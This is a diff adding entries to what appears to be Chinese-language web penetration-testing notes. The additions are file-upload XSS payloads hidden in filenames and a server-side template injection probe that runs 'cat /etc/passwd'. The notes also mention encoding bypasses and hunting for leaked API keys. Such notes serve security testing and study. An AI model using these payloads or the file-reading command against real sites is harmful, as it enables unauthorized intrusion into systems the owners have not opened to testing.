@@ -52,6 +52,13 @@ try URL encode
 try double URL encode.
 try triple URL encode.
 try base64 encode.
+文件上传 XSS---修改文件名参数以包含 XSS 负载
+a) <img src=x onerror=alert('XSS')>.png
+b) "><img src=x onerror=alert('XSS')>.png
+c) "><svg onmouseover=alert(1)>.svg
+d)<<script>alert('xss')<!--a-->a.png
+
+
 
 原型污染是一种javascript漏洞，攻击者可以将任意属性添加到全局变量原型，然后这些属性可能被用户定义的对象继承。
 
@@ -182,3 +189,7 @@ alert = window[“al”+“ert”]。通过将“alert”关键字分成两部�
 # 敏感信息泄露
 1、发现敏感信息-key
 2、进行 Google 搜索 使用键名后跟术语“api docs curl”进行 Google 搜索，发现API接口
+
+# SSTI 
+payload: {{7*7}} 得到结果49 证明存在
+读取etc/passwd  {{system('cat /etc/passwd')}}
